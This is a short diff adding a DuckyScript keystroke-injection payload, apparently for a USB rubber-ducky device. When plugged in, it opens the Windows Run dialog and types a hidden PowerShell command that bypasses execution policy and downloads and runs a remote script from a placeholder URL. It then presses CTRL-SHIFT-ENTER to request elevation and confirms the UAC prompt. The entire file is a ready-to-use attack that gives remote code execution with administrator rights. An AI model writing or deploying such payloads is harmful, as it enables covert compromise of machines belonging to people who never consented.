@@ -1,0 +1,11 @@
+DELAY 1000
+GUI r
+DELAY 500
+
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://REPLACE_WITH_URL/FILENAME.ps1')"
+
+CTRL-SHIFT ENTER
+DELAY 2000
+
+LEFT
+ENTER
